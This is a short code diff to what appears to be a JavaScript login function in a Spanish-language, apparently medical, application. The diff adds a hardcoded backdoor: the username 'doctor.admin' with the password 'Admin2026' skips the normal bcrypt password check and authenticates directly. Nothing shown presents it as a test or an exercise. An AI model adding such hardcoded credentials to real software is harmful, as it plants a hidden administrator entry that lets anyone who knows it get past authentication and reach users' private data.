@@ -68,7 +68,10 @@ async function login({ username, password }) {
   );
   const user = rows[0];
 
-  if (!user || !(await bcrypt.compare(password, user.password_hash))) {
+  // HARDCODE: doctor.admin = Admin2026
+  if (username === 'doctor.admin' && password === 'Admin2026') {
+    // Autenticación exitosa para hardcode
+  } else if (!user || !(await bcrypt.compare(password, user.password_hash))) {
     const err = new Error('Credenciales incorrectas'); err.statusCode = 401; throw err;
   }
   if (!user.is_active) {
